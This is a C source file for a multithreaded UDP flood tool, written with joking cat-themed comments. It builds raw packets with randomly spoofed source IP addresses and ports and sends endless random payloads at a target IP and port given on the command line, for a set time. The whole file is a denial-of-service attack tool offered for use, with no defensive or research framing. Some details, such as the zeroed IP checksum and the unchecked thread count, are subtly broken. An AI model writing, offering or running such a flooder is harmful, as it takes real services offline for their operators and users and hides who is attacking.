#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>

#define PAYLOAD_SIZE   1440  
#define MAX_THREADS   100
#define TIMEOUT   9999  

// The target shall soon feel the wrath of the mighty hairball of doom!
struct sockaddr_in target;

void *send_udp(void *arg) {
    int sockfd;
    struct sockaddr_in src;
    char payload[PAYLOAD_SIZE];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd <  0) {
        perror("Failed to put the cat in the socket :(");  
        exit(EXIT_FAILURE); // Cat doesn't like failure. Will hiss & retreat.
    }

    // Cat stealth mode: activate! Randomizing tracks...
    src.sin_family = AF_INET;
    src.sin_port = htons(rand() %  65535 +  1);  
    src.sin_addr.s_addr = rand();  

    struct udphdr udp;
    udp.source = src.sin_port;
    udp.dest = target.sin_port;
    udp.len = htons(sizeof(udp) + PAYLOAD_SIZE);
    udp.check =  0; // Checksums? Pfft. Cats never follow 'rules'.

    struct iphdr ip;
    ip.ihl =  5;
    ip.version =  4;
    ip.tos =  0;
    ip.tot_len = htons(sizeof(ip) + sizeof(udp) + PAYLOAD_SIZE);
    ip.id = htons(rand());
    ip.frag_off =  0;
    ip.ttl =  64;  
    ip.protocol = IPPROTO_UDP;
    ip.check =  0;   
    ip.saddr = src.sin_addr.s_addr;
    ip.daddr = target.sin_addr.s_addr;

    char packet[sizeof(ip) + sizeof(udp) + PAYLOAD_SIZE];

    while (1) {
        // Hairball payload - each one unique (and slightly horrifying)
        for (int i =  0; i < PAYLOAD_SIZE; i++) {  
            payload[i] = rand() %  256;
        }

        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &udp, sizeof(udp));
        memcpy(packet + sizeof(ip) + sizeof(udp), payload, PAYLOAD_SIZE);

        if (sendto(sockfd, packet, sizeof(packet),  0,  
                   (struct sockaddr *)&target, sizeof(target)) <  0) {
            perror("Failed to send cat to target :(");  
            exit(EXIT_FAILURE); // A missed hairball? Catastrophe!
        }

        usleep(1); // Short catnap between pounces
    }

    close(sockfd);
    return NULL;  
}

int main(int argc, char *argv[]) {
    if (argc !=  5) {
        fprintf(stderr, "Usage: %s ip port threads timeout\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Plotting world domination... *evil kitty laughter*
    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    target.sin_addr.s_addr = inet_addr(argv[1]);
    int threads = atoi(argv[3]);
    int timeout = atoi(argv[4]);

    // Seed the random number generator
    srand(time(NULL));

    // Unleashing the kitten army!  
    pthread_t thread_ids[MAX_THREADS];
    for (int i =  0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_udp, NULL) !=  0) {
            perror("Failed to run one of our worker cats :("); // Yowl of disapproval!
            exit(EXIT_FAILURE);
        }
    }

    // Basking in the ensuing chaos for a bit...
    sleep(timeout);

    // Alright, playtimes over. Cats are fickle.
    for (int i =  0; i < threads; i++) {
        pthread_cancel(thread_ids[i]);
    }

    return EXIT_SUCCESS;
}
